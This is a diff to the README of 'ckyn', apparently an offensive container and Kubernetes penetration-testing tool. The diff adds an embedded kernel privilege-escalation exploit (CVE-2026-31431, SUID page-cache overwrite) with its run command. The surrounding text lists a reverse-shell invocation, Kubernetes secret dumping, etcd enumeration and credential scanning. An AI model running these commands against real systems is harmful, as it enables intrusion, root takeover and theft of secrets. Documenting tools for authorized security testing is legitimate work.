@@ -8,7 +8,8 @@ A focused container security assessment tool for penetration testing and securit
 - **Container Escape** - Exploit container escape vulnerabilities
 - **K8s Exploitation** - Kubernetes cluster exploitation
 - **Credential Scanning** - Find leaked secrets and credentials
-- **Remote Control** - Reverse shell and kubelet exec
+- **Privilege Escalation** - CVE-2026-31431 copy-fail exploit
+- **Embedded Busybox** - 400+ Unix utilities in a single binary
 
 ## Quick Start
 
@@ -21,12 +22,25 @@ A focused container security assessment tool for penetration testing and securit
 
 # Run specific exploit
 ./ckyn run <exploit-name> [<args>...]
+
+# Use embedded busybox
+./ckyn busybox ls -la
+./ckyn busybox ps aux
+./ckyn busybox --list
 ```
+
+## Embedded Binaries
+
+| Binary | Architecture | Source | Description |
+|--------|--------------|--------|-------------|
+| busybox | x86_64, static | [busybox-static-binaries-fat](https://github.com/shutingrz/busybox-static-binaries-fat) | 400+ Unix utilities |
+| exploit-passwd | x86_64, static | [copy-fail-c](https://github.com/tgies/copy-fail-c/releases) | CVE-2026-31431 LPE |
 
 ## Available Tools
 
 | Tool | Command | Description |
 |------|---------|-------------|
+| busybox | `ckyn busybox [<args>...]` | Embedded busybox with 400+ Unix utilities |
 | kcurl | `ckyn kcurl <token> get\|post <url>` | Request K8s API Server |
 | ectl | `ckyn ectl <endpoint> get <key>` | Enumerate etcd keys |
 | ucurl | `ckyn ucurl get\|post <socket> <url>` | Request Docker Unix Socket |
@@ -48,12 +62,18 @@ A focused container security assessment tool for penetration testing and securit
 ./ckyn run shim-pwn reverse <ip> <port>
 ```
 
+## Privilege Escalation
+
+```bash
+# CVE-2026-31431 copy-fail exploit
+# Overwrites SUID binary page cache via AF_ALG + splice
+# Affects kernels 4.14 - 6.x
+./ckyn run copy-fail-cve-2026-31431 [/usr/bin/su]
+```
+
 ## K8s Exploitation
 
 ```bash
-# Get Service Account Token
-./ckyn run k8s-get-sa-token <method> <endpoint>
-
 # Dump K8s secrets
 ./ckyn run k8s-secret-dump <token>
 
@@ -68,7 +88,7 @@ A focused container security assessment tool for penetration testing and securit
 ./ckyn run ak-leakage /path/to/scan
 
 # Supported patterns:
-# - AWS API Key
+# - AWS API Key (AKIA...)
 # - SSH/RSA/PGP private keys
 # - GitHub/Google/Facebook OAuth tokens
 # - Slack tokens and webhooks
@@ -78,18 +98,27 @@ A focused container security assessment tool for penetration testing and securit
 ## Build
 
 ```bash
-# Linux amd64
+# Linux amd64 (includes embedded binaries)
 CGO_ENABLED=0 GOOS=linux GOARCH=amd64 go build -ldflags="-w -s" ./cmd/ckyn/
 
 # With compression
 upx --best ckyn
 ```
 
+## Binary Size
+
+| Component | Size |
+|-----------|------|
+| Go code + exploits | ~13MB |
+| Embedded busybox | ~1.1MB |
+| Embedded exploit-passwd | ~1.0MB |
+| **Total** | **~16MB** |
+
 ## Why Ckyn?
 
 - **Focused** - Only container/K8s security features
-- **Lightweight** - ~14MB binary, no external dependencies
-- **Complementary** - Works alongside busybox, linpeas
+- **Self-contained** - Includes busybox and exploit binaries
+- **Complementary** - Works alongside linpeas, other tools
 - **Fast** - Quick evaluation and exploitation
 
 ## Legal Disclaimer
